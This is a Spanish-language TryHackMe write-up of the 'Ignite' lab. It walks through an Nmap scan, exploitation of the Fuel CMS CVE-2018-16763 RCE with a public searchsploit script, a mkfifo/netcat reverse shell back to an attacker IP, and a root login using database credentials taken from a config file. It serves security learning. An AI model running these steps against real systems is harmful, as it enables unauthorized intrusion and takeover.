# Ignite — TryHackMe

**Plataforma:** TryHackMe  
**Dificultad:** Fácil  
**OS:** Linux  
**Técnicas:** Enumeración de versión CMS, CVE-2018-16763 (Fuel CMS RCE), Searchsploit, Reverse Shell, Reutilización de contraseña para privesc

---

## Reconocimiento

Escaneo inicial con Nmap:

```bash
nmap -sS -sC -sV -Pn 10.130.145.232
```

![Nmap scan](TryHackMe/Ignite/assets/1.png)

Puerto descubierto: **80/tcp — HTTP** (Apache 2.4.18, Ubuntu). 

---

## Análisis de la aplicación web

Al acceder al objetivo encontramos una página de bienvenida de **Fuel CMS** que muestra la **Versión 1.4**.

![Fuel CMS](TryHackMe/Ignite/assets/2.png)

La propia página filtra el nombre y la versión del CMS — no se necesita enumeración adicional para identificar la tecnología.

---

## Explotación — CVE-2018-16763 (RCE)

Buscamos exploits conocidos:

```bash
searchsploit fuel cms
searchsploit -m linux/webapps/47138.py
```

![Searchsploit](TryHackMe/Ignite/assets/3.png)

CVE-2018-16763 afecta a Fuel CMS ≤ 1.4.1 y permite ejecución remota de código sin autenticación a través del parámetro `filter` en `/fuel/pages/select/`.

El exploit (`47138.py`) está escrito en Python 2. Antes de ejecutarlo hay que hacer dos modificaciones:

1. Cambiar la variable `url` por la IP del objetivo
2. Eliminar la configuración del proxy de Burp (dejar `proxy = {}`)

![Exploit code](TryHackMe/Ignite/assets/4.png)

Ejecutamos el exploit:

```bash
python2 47138.py
```

Esto abre una pseudo-shell interactiva. Ejecutando `id` confirmamos ejecución como `www-data`.

Preparamos un listener y enviamos el payload de reverse shell desde la pseudo-shell:

```bash
# Listener
nc -lvnp 4444

# Payload enviado desde la shell del exploit
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.X.X.X 4444 >/tmp/f
```

Shell obtenida como `www-data`.

---

## Escalada de privilegios

Enumeramos los archivos de configuración de la aplicación web:

```bash
cat /var/www/html/fuel/application/config/database.php
```

![Database credentials](TryHackMe/Ignite/assets/5.png)

Credenciales encontradas:

```
username: root
password: mememe
```

Estabilizamos la shell e intentamos reutilizar la contraseña:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
su root
# Contraseña: mememe
```

![Root shell](TryHackMe/Ignite/assets/6.png)

Shell como **root** obtenida.

---

## Resumen

|Fase|Técnica|
|---|---|
|Reconocimiento|Nmap (-sS -sC -sV)|
|Filtrado de versión|Versión del CMS visible en la página de bienvenida|
|Acceso inicial|CVE-2018-16763 → RCE → reverse shell con mkfifo|
|Escalada de privilegios|Credenciales de BD en texto plano reutilizadas en OS|

---

## Lo que aprendí

- **Flujo de trabajo con Searchsploit** — `searchsploit <término>` para buscar exploits localmente, `-x` para leer sin copiar, `-m` para copiar al directorio de trabajo. Más rápido que navegar por Exploit-DB manualmente.
- **Adaptar exploits de Python 2** — identificar sintaxis de Python 2 (`raw_input`, `print` sin paréntesis) y ejecutar con `python2`. Resolver dependencias con `python2 -m pip install requests`.
- **Proxy mal configurado en exploits públicos** — algunos exploits llevan Burp hardcodeado. Poner `proxy = {}` elimina la dependencia de un proxy activo.
- **Reverse shell con mkfifo (named pipe)** — alternativa fiable cuando `bash -i >& /dev/tcp/...` falla en shells no interactivas. Crea un canal de comunicación bidireccional a través de un named pipe.
- **Credenciales hardcodeadas en ficheros de configuración** — los CMS y frameworks web suelen guardar credenciales de BD en texto plano. En CodeIgniter/Fuel CMS el objetivo es `fuel/application/config/database.php`. Las credenciales encontradas aquí merecen probarse para login a nivel de OS (reutilización de contraseña).
- **Estabilizar la shell antes de `su`** — `su` requiere una TTY real. Generarla con `python3 -c 'import pty;pty.spawn("/bin/bash")'` es un paso previo obligatorio.